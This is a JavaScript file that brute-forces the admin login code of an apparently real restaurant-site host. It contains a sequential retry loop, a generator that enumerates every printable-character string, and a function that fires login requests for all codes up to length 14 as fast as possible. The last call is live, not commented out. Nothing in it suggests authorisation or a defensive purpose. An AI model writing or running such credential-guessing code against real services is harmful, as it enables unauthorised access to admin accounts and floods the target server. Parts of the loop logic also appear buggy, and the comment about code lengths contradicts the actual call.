import fetch from 'node-fetch'; // or use global fetch in browsers

async function login(code) {
  const url = `https://toulousedining.emergent.host/api/admin/login?code=${encodeURIComponent(code)}`;

  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
      // add auth headers, etc. if needed
    },
    body: JSON.stringify({ /* any payload */ })
  });

  if (!res.ok) {
    throw new Error(`Login failed: ${res.status} ${res.statusText}`);
  }

  const data = await res.json();
  return data;
}



const chars = `!"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_abcdefghijklmnopqrstuvwxyz{|}~`;

// helper that retries the login until successful
async function tryLoginWithRetry() {
let code = "!"
let i = 0

  while (true) {
    if (code[code.length - 1] === "~") {
      i = 0
      code += chars[i]
    } else {
      code = code.slice(0, -1) + chars[i]
    }
    try {
      console.log('Trying code:', code);
      const result = await login(code);
      console.log('login succeeded:', result);
      break; // exit loop once login works
    } catch (err) {
      console.error('login failed, retrying...', err);
      // wait a second before retrying
      await new Promise(r => setTimeout(r, 1000));
      i++
    }
  }
}

// usage example (sequential brute‑force)
// tryLoginWithRetry();


// ---------------------------------------------------------------------------
// asynchronous, fire-all-at-once helper that resolves with the first successful
// login and ignores (but logs) errors from the others.
// codes should be an iterable of strings to try.
async function firstSuccessfulLogin(codes) {
  const attempts = Array.from(codes, code =>
    login(code).then(result => ({ code, result }))
  );

  try {
    const { code, result } = await Promise.any(attempts);
    console.log('first successful code:', code);
    return result;
  } catch (aggregateErr) {
    // Promise.any fails only if all promises reject
    console.error('all login attempts failed', aggregateErr.errors);
    throw aggregateErr;
  }
}

// example usage with a small batch of codes:
// firstSuccessfulLogin(['abc', 'def', 'ghi'])
//   .then(data => console.log('got data', data))
//   .catch(err => console.error('no code worked', err));


// generator that enumerates strings increasing length from the given charset
// up to maxLength (inclusive). stops when length exceeds maxLength.
function* generateCodes(chars, maxLength = Infinity) {
  let length = 1;
  while (length <= maxLength) {
    const indexes = Array(length).fill(0);
    while (true) {
      console.log(indexes.map(i => chars[i]).join(''));
      yield indexes.map(i => chars[i]).join('');

      // increment the "number" represented by indexes
      let pos = length - 1;
      while (pos >= 0) {
        indexes[pos]++;
        if (indexes[pos] < chars.length) break;
        indexes[pos] = 0;
        pos--;
      }
      if (pos < 0) break; // overflow, go to next length
    }
    length++;
  }
}

// fire login calls for every code produced by the generator as fast as
// possible, up to length maxLength. the returned promise resolves with the
// first successful response; failures are logged and otherwise ignored.
async function firstSuccessfulLoginFromChars(chars, maxLength) {
  const gen = generateCodes(chars, maxLength);

  return new Promise((resolve) => {
    for (const code of gen) {
      login(code)
        .then(result => {
          console.log('code succeeded:', code);
          resolve(result);
        })
        .catch(err => {
          // just ignore failures but log them if you like
          // console.error('failed', code, err);
        });
    }
  });
}

// example of using the dynamic helper: try all codes from length 1 to 3
// ("!", "\"", "#", ..., "~", "!!", "!"", "!#", ..., "~~~")
firstSuccessfulLoginFromChars(chars, 14)
  .then(data => console.log('got data', data));
